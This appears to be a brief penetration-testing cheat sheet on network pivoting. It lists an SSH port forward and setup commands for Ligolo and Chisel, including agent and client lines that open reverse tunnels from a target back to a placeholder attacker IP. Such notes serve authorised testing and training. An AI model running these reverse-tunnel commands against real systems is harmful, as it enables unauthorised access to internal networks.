SSH Tunnel
```bash 
ssh -L [port]:host:port [sshConnection]
```

Ligolo
```bash
#add interface
sudo ip tuntap add user kali mode tun ligolo

#up interface
sudo ip link set ligolo up 

#start ligolo server
./proxy -selfcert -laddr 0.0.0.0:443

#start ligolo client 
./agent -connect '<attacker-ip>:<attacker-port>' -ignore-cert 

#optional if target open service on localhost
sudo ip route add 240.0.0.1/32 dev ligolo
```

Chisel
```bash
#open chisel server
./chisel -p 9999 --reverse

#connect chisel server
./chisel client '<attacker-ip>:<attacker-port>' R:socks
```